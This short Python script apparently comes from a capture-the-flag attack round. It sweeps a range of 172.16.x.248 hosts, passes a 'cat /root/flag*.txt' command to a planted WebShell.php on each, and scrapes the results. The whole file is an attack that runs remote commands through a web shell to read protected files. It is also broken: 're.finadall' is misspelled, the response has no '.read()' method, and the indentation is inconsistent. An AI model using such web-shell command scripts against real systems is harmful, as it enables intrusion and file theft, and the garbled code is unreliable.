import requests
import re
for i in range(100,111):
        try:
            res=requests.get("http://172.16."+str(i)+".248/WebShell.php?cmd=cat+%2Froot%2Fflag*.txt")
            flag=re.finadall('<pre>(.*)</pre>',res.read())
            print (flag,i)
         except:
                pass
